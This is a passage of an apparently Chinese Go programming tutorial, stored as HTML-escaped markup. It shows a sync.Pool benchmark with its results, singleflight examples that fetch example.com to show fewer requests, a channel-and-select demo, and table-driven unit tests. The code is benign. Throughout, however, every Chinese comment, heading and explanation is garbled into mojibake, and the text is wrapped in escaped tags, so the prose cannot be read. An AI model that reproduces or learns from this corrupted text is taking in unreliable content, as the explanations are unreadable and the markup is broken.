&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;/span&gt;{} {&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &amp;amp;AddressModule{&lt;br/&gt;Country: &amp;amp;Country{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;Province: &amp;amp;Province{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;City: &amp;amp;City{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;County: &amp;amp;County{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;Street: &amp;amp;Street{&lt;br/&gt;ID:   &lt;span&gt;0&lt;/span&gt;,&lt;br/&gt;Name: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;}&lt;br/&gt;},&lt;br/&gt;}&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;&lt;span&gt;// ä»ç¼“å­˜æ± ä¸­è·å–å¯¹è±¡&lt;/span&gt;&lt;br/&gt;addressModule, _ := (demoPool.Get()).(*AddressModule)&lt;br/&gt;&lt;span&gt;// ä¸‹é¢è¿™æ®µä»£ç æ²¡æ„ä¹‰ åªæ˜¯ä¸ºäº†ä¸æŠ¥è¯­æ³•é”™è¯¯&lt;/span&gt;&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; addressModule == &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// é‡ç½®å¯¹è±¡ å‡†å¤‡å½’è¿˜å¯¹è±¡åˆ°ç¼“å­˜æ± &lt;/span&gt;&lt;br/&gt;addressModule.Consignee = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Email = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Mobile = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;addressModule.Country.ID = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;addressModule.Country.Name = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Province.ID = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;addressModule.Province.Name = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.County.ID = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;addressModule.County.Name = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Street.ID = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;addressModule.Street.Name = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.DetailedAddress = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.PostalCode = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.IsDefault = &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;addressModule.Label = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Longitude = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;addressModule.Latitude = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// è¿˜å¯¹è±¡åˆ°ç¼“å­˜æ± &lt;/span&gt;&lt;br/&gt;demoPool.Put(addressModule)&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// ä½¿ç”¨sync.Poolæ‰§è¡Œç»“æœ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// goos: darwin&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// goarch: amd64&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// pkg: demo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// cpu: Intel(R) Core(TM) i5-7360U CPU @ 2.30GHz&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkDemo_Pool-4   988550808        12.41 ns/op       0 B/op       0 allocs/op&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ok  demo14.215s&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;span&gt;ä½¿ç”¨sync.Poolæ‰§è¡Œåˆ†æï¼š&lt;/span&gt;&lt;span&gt;ç«ç„°å›¾&amp;amp;Topå‡½æ•°&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;runtime.mallocgc å·²ç»åœ¨topé‡Œé¢çœ‹ä¸è§äº†&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.1925925925925926&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMe16EW56bQksaKq4b9bLlQ2Fib25iaaq7cn0HFC0eGcCsMruas77TS2Sqw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;span&gt;Â &lt;/span&gt;&lt;img data-ratio=&quot;0.5722222222222222&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMes2u2MvF8kEZoT9JpYURIpzx3zlXAXzL9p6nqqkRmrDyLEM6icDcuAIg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1033&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;å…³äºç«ç„°å›¾å’ŒTopå‡½æ•°çš„ä½¿ç”¨ä¸‹é¢ä¼šè®²åˆ°ã€‚&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;1037&quot;&gt;&lt;span&gt;6. å‡å°‘ç¼“å­˜ç©¿é€åˆ©å™¨ä¹‹&lt;/span&gt;&lt;code&gt;&lt;span&gt;singleflight&lt;/span&gt;&lt;/code&gt;&lt;span&gt;åŒ…çš„ä½¿ç”¨&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;1039&quot;&gt;&lt;p data-line=&quot;1039&quot;&gt;&lt;span&gt;ä½œç”¨ï¼šç¼“å­˜ç­‰ç©¿é€æ—¶å‡å°‘è¯·æ±‚æ•°ã€‚&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1041&quot;&gt;&lt;span&gt;ä½¿ç”¨ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1042&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;io/ioutil&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&quot;golang.org/x/sync/singleflight&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// æ²¡æœ‰ä½¿ç”¨singleflightçš„ä»£ç ç¤ºä¾‹&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;TestDemo_NoSingleflight&lt;/span&gt;&lt;span&gt;(t *testing.T)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;t.Parallel()&lt;br/&gt;wg := sync.WaitGroup{}&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿå¹¶å‘è¿œç¨‹è°ƒç”¨&lt;/span&gt;&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i := &lt;span&gt;0&lt;/span&gt;; i &amp;lt; &lt;span&gt;3&lt;/span&gt;; i++ {&lt;br/&gt;wg.Add(&lt;span&gt;1&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; wg.Done()&lt;br/&gt;resp, err := http.Get(&lt;span&gt;&quot;http://example.com&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;_, err = ioutil.ReadAll(resp.Body)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;t.Log(&lt;span&gt;&quot;log&quot;&lt;/span&gt;)&lt;br/&gt;}()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;wg.Wait()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// ä½¿ç”¨singleflightçš„ä»£ç ç¤ºä¾‹&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;TestDemo_Singleflight&lt;/span&gt;&lt;span&gt;(t *testing.T)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;t.Parallel()&lt;br/&gt;singleGroup := singleflight.Group{}&lt;br/&gt;wg := sync.WaitGroup{}&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿå¹¶å‘è¿œç¨‹è°ƒç”¨&lt;/span&gt;&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i := &lt;span&gt;0&lt;/span&gt;; i &amp;lt; &lt;span&gt;3&lt;/span&gt;; i++ {&lt;br/&gt;wg.Add(&lt;span&gt;1&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; wg.Done()&lt;br/&gt;&lt;span&gt;// ä½¿ç”¨singleflight&lt;/span&gt;&lt;br/&gt;res, err, shared := singleGroup.Do(&lt;span&gt;&quot;cache_key&quot;&lt;/span&gt;, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;(&lt;span&gt;interface&lt;/span&gt;{}, error)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;resp, err := http.Get(&lt;span&gt;&quot;http://example.com&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;nil&lt;/span&gt;, err&lt;br/&gt;}&lt;br/&gt;body, err := ioutil.ReadAll(resp.Body)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;nil&lt;/span&gt;, err&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; body, &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;})&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;_, _ = res.([]&lt;span&gt;byte&lt;/span&gt;)&lt;br/&gt;t.Log(&lt;span&gt;&quot;log&quot;&lt;/span&gt;, shared, err)&lt;br/&gt;}()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;wg.Wait()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;1116&quot;&gt;&lt;p data-line=&quot;1116&quot;&gt;&lt;span&gt;æŠ“åŒ…åŸŸåexample.comçš„è¯·æ±‚ï¼štcpdump host example.com&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;h5&gt;&lt;span&gt;æ²¡æœ‰ä½¿ç”¨Singleflightä¸€å…±å‘èµ·äº†3æ¬¡è¯·æ±‚&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.44537037037037036&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeGHeNlQRktH44mxXCxw2UJRks7qXs0R2U83l0AlrJsnNHpe7lx1ZsmA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h5&gt;&lt;span&gt;ä½¿ç”¨Singleflightåªå‘èµ·äº†1æ¬¡è¯·æ±‚&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.15462962962962962&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeJf9V4TRZ5K1Krb9S9H3ibkMK9vaiatuoqjzBib2ksxXrzGedZ3m9avMaw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;7. Channelçš„ä½¿ç”¨&lt;/span&gt;&lt;/p&gt;&lt;blockquote data-line=&quot;1127&quot;&gt;&lt;p data-line=&quot;1127&quot;&gt;&lt;span&gt;ä½œç”¨ï¼šä¸è¦é€šè¿‡å…±äº«å†…å­˜æ¥é€šä¿¡ï¼Œè¦é€šè¿‡é€šä¿¡æ¥å®ç°å…±äº«å†…å­˜ã€‚ç›¸å½“äºç®¡é“ã€‚&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1129&quot;&gt;&lt;span&gt;ä½¿ç”¨ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1130&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;time&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å“åº”å…¬å…±ç»“æ„ä½“&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; APIBase &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;Code    &lt;span&gt;int32&lt;/span&gt;  &lt;span&gt;`json:&quot;code&quot;`&lt;/span&gt;&lt;br/&gt;Message &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;message&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿæ¥å£Açš„å“åº”ç»“æ„ä½“&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; APIDemoA &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;APIBase&lt;br/&gt;Data APIDemoAData &lt;span&gt;`json:&quot;data&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; APIDemoAData &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;Title &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;title&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿæ¥å£Bçš„å“åº”ç»“æ„ä½“&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; APIDemoB &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;APIBase&lt;br/&gt;Data APIDemoBData &lt;span&gt;`json:&quot;data&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; APIDemoBData &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;SkuList []&lt;span&gt;int64&lt;/span&gt; &lt;span&gt;`json:&quot;sku_list&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿæ¥å£é€»è¾‘&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// åˆ›å»ºæ¥å£Aä¼ è¾“ç»“æœçš„é€šé“&lt;/span&gt;&lt;br/&gt;execAResult := &lt;span&gt;make&lt;/span&gt;(&lt;span&gt;chan&lt;/span&gt; APIDemoA)&lt;br/&gt;&lt;span&gt;// åˆ›å»ºæ¥å£Bä¼ è¾“ç»“æœçš„é€šé“&lt;/span&gt;&lt;br/&gt;execBResult := &lt;span&gt;make&lt;/span&gt;(&lt;span&gt;chan&lt;/span&gt; APIDemoB)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å¹¶å‘è°ƒç”¨æ¥å£A&lt;/span&gt;&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(execAResult &lt;span&gt;chan&lt;/span&gt;&amp;lt;- APIDemoA)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿæ¥å£Aè¿œç¨‹è°ƒç”¨è¿‡ç¨‹&lt;/span&gt;&lt;br/&gt;time.Sleep(&lt;span&gt;2&lt;/span&gt; * time.Second)&lt;br/&gt;execAResult &amp;lt;- APIDemoA{}&lt;br/&gt;}(execAResult)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å¹¶å‘è°ƒç”¨æ¥å£B&lt;/span&gt;&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(execBResult &lt;span&gt;chan&lt;/span&gt;&amp;lt;- APIDemoB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿæ¥å£Bè¿œç¨‹è°ƒç”¨è¿‡ç¨‹&lt;/span&gt;&lt;br/&gt;time.Sleep(&lt;span&gt;1&lt;/span&gt; * time.Second)&lt;br/&gt;execBResult &amp;lt;- APIDemoB{}&lt;br/&gt;}(execBResult)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; resultA APIDemoA&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; resultB APIDemoB&lt;br/&gt;i := &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; i &amp;gt;= &lt;span&gt;2&lt;/span&gt; {&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;é€€å‡º&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;break&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;select&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;case&lt;/span&gt; resultA = &amp;lt;-execAResult: &lt;span&gt;// ç­‰å¾…æ¥å£Açš„å“åº”ç»“æœ&lt;/span&gt;&lt;br/&gt;i++&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;resultA&quot;&lt;/span&gt;, resultA)&lt;br/&gt;&lt;span&gt;case&lt;/span&gt; resultB = &amp;lt;-execBResult: &lt;span&gt;// ç­‰å¾…æ¥å£Bçš„å“åº”ç»“æœ&lt;/span&gt;&lt;br/&gt;i++&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;resultB&quot;&lt;/span&gt;, resultB)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// resultB {{0 } {[]}}&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// resultA {{0 } {}}&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// é€€å‡º&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;1210&quot;&gt;&lt;span&gt;8.Â  å•å…ƒæµ‹è¯•&amp;amp;åŸºå‡†æµ‹è¯•&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;1212&quot;&gt;&lt;p data-line=&quot;1212&quot;&gt;&lt;span&gt;ä½œç”¨ï¼šå¼€å‘é˜¶æ®µè°ƒè¯•ä»£ç å—ã€æ¥å£ï¼›å¯¹ä»£ç å—ã€æ¥å£åšåŸºå‡†æµ‹è¯•ï¼Œåˆ†ææ€§èƒ½é—®é¢˜ï¼ŒåŒ…å«CPUä½¿ç”¨ã€å†…å­˜ä½¿ç”¨ç­‰ã€‚å¯åšå¯¹æ¯”æµ‹è¯•ã€‚cié˜¶æ®µæ£€æµ‹ä»£ç è´¨é‡å‡å°‘bugã€‚&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1214&quot;&gt;&lt;span&gt;ä½¿ç”¨ï¼š&lt;/span&gt;&lt;/p&gt;&lt;h2 data-line=&quot;1216&quot;&gt;&lt;span&gt;8.1 å•å…ƒæµ‹è¯•&lt;/span&gt;&lt;/h2&gt;&lt;p data-line=&quot;1218&quot;&gt;&lt;span&gt;ä¸€ä¸ªå¾ˆç®€å•çš„å•å…ƒæµ‹è¯•ç¤ºä¾‹ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1219&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;io/ioutil&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;TestDemo&lt;/span&gt;&lt;span&gt;(t *testing.T)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;t.Parallel()&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿè°ƒç”¨æ¥å£&lt;/span&gt;&lt;br/&gt;resp, err := http.Get(&lt;span&gt;&quot;http://example.com?user_id=121212&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;body, err := ioutil.ReadAll(resp.Body)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;t.Log(&lt;span&gt;&quot;body&quot;&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;(body))&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// go test -timeout 30s -run ^TestDemo$ demo -v -count=1&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === RUN   TestDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === PAUSE TestDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === CONT  TestDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ......&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// --- PASS: TestDemo (0.45s)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ok      demo    1.130s&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;1255&quot;&gt;&lt;span&gt;å¤šä¸ªæµ‹è¯•ç”¨ä¾‹çš„å•å…ƒæµ‹è¯•ç¤ºä¾‹ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1256&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;io/ioutil&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Req &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;UserID &lt;span&gt;int64&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;TestDemo&lt;/span&gt;&lt;span&gt;(t *testing.T)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;t.Parallel()&lt;br/&gt;tests := []&lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;TestName &lt;span&gt;string&lt;/span&gt;&lt;br/&gt;*Req&lt;br/&gt;}{&lt;br/&gt;{&lt;br/&gt;TestName: &lt;span&gt;&quot;æµ‹è¯•ç”¨ä¾‹1&quot;&lt;/span&gt;,&lt;br/&gt;Req: &amp;amp;Req{&lt;br/&gt;UserID: &lt;span&gt;12121212&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;},&lt;br/&gt;{&lt;br/&gt;TestName: &lt;span&gt;&quot;æµ‹è¯•ç”¨ä¾‹2&quot;&lt;/span&gt;,&lt;br/&gt;Req: &amp;amp;Req{&lt;br/&gt;UserID: &lt;span&gt;829066&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;},&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; _, v := &lt;span&gt;range&lt;/span&gt; tests {&lt;br/&gt;t.Run(v.TestName, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(t *testing.T)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿè°ƒç”¨æ¥å£&lt;/span&gt;&lt;br/&gt;url := fmt.Sprintf(&lt;span&gt;&quot;http://example.com?user_id=%d&quot;&lt;/span&gt;, v.UserID)&lt;br/&gt;resp, err := http.Get(url)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;body, err := ioutil.ReadAll(resp.Body)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;t.Log(&lt;span&gt;&quot;body&quot;&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;(body), url)&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// go test -timeout 30s -run ^TestDemo$ demo -v -count=1&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === RUN   TestDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === PAUSE TestDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === CONT  TestDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === RUN   TestDemo/æµ‹è¯•ç”¨ä¾‹1&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ...&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === RUN   